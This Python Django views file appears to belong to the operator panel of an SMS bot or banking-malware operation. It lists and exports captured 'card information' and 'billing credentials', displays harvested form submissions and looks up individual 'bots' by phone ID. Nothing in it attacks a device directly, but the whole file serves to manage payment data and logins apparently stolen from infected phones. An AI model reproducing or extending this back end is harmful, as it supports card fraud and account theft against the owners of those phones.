import logging

from bson.objectid import ObjectId
from django import forms
from django.conf import settings
from django.contrib import messages
from django.contrib.admin.views.decorators import staff_member_required
from django.shortcuts import render, redirect, get_object_or_404
from django.utils.translation import ugettext_lazy as _
from django.views.decorators.http import require_http_methods
import pymongo

from decorators import admin_user_required
import models

logger = logging.getLogger(__name__)


@staff_member_required
def card_info_list(request, export=None):
    info = settings.MONGO['extra_data'].find(
        {'type': 'userdata', 'data.type': 'card information', 'hidden': {'$ne': 'y'}})
    cl = {'opts': {'app_label': "smsapp"}}

    tmpl = 'admin/smsapp/info/cards.html'
    ct = "text/html"
    if export:
        tmpl = 'admin/smsapp/info/cards.txt'
        ct = "text/plain"
    return render(request, tmpl, {'cards': info, 'cl': cl}, content_type=ct)


@staff_member_required
def hide_card_info(request, oid):
    settings.MONGO['extra_data'].update({"_id": ObjectId(oid)}, {'$set': {'hidden': 'y'}})
    return redirect('card_list')


@admin_user_required
def billing_acc_list(request):
    acc_types = [
        ('', '----')
    ]
    ts = settings.MONGO['extra_data'].find({'data.type': "billing credentials"}).distinct('data.name')
    for t in ts:
        acc_types.append((t, t))

    class AccTypeForm(forms.Form):
        t1 = forms.ChoiceField(choices=acc_types, label=_("account type"), required=False)

    type_filter = {'type': 'userdata', 'data.type': 'billing credentials'}
    if request.POST.get('t1'):
        type_filter['data.name'] = request.POST.get('t1')
    info = settings.MONGO['extra_data'].find(type_filter)
    cl = {'opts': {'app_label': "smsapp"}}
    return render(request, 'admin/smsapp/info/bill.html',
                  {'accounts': info, 'cl': cl, 'type_form': AccTypeForm(request.POST or None)})


@admin_user_required
def html_form_details(request, objid):
    obj = settings.MONGO['extra_data'].find_one(ObjectId(objid))
    cl = {'opts': {'app_label': "smsapp"}}
    form = obj['data']
    return render(request, 'admin/smsapp/info/html_form_details.html', {'form': form, 'cl': cl})


@admin_user_required
def html_forms_list(request):
    info = settings.MONGO['extra_data'].find({'type': 'userdata', 'data.type': 'js_form'}).sort('data.name',
                                                                                                pymongo.ASCENDING)
    cl = {'opts': {'app_label': "smsapp"}}
    return render(request, 'admin/smsapp/info/html_forms_list.html', {'forms': info, 'cl': cl})


@admin_user_required
@require_http_methods(["POST"])
def html_form_delete(request):
    ids = map(lambda _id: ObjectId(_id), request.POST.getlist("form_delete"))
    logger.debug(u"deleting forms {0}".format(ids))
    res = settings.MONGO['extra_data'].remove({"_id": {"$in": ids}})
    messages.success(request, u"Deleted {0} forms".format(res.get('n')))
    return redirect('html_forms_list')


@admin_user_required
def top_apps(request):
    def get_country_choices():
        import pycountry

        choices = [(None, '----')]
        for d in models.PhoneData.objects.order_by('country').distinct().values('country'):
            ccode = d['country']
            try:
                c = pycountry.countries.get(alpha2=ccode)
                choices.append((ccode, c.name))
            except KeyError:
                logger.error(u"Unknown country: {0}".format(ccode))
        return choices

    class CountryForm(forms.Form):
        country = forms.ChoiceField(choices=get_country_choices())

    cl = {'opts': {'app_label': "smsapp"}}
    if request.POST.get('country'):
        ta = models.InstalledApp.objects.get_top_apps_by_country(request.POST.get('country'))
    else:
        ta = models.InstalledApp.objects.get_top_apps()
    return render(request, 'admin/smsapp/info/apps.html', {'cl': cl, 'apps': ta,
                                                           'country_form': CountryForm(request.POST or None)})


# noinspection PyUnusedLocal
@admin_user_required
def view_bot(request, code=None):
    if code is None and request.method == 'POST':
        code = request.POST.get('code')
    phone = get_object_or_404(models.PhoneData, uniq_id=code)
    return redirect('admin:smsapp_phonedata_change', phone.id)


@admin_user_required
def country_list_admin(request):
    countries = models.PhoneData.objects.get_country_list_total()
    cl = {'opts': {'app_label': "smsapp"}}
    return render(request, 'admin/smsapp/info/countries.html', {'cl': cl, 'data': countries})


@admin_user_required
def crash_report(request, oid):
    o = settings.MONGO['extra_data'].find_one(ObjectId(oid))
    d = {'code': o['code'], 'data': o['data']}
    return render(request, 'admin/smsapp/phonedata/view_report.html', d)
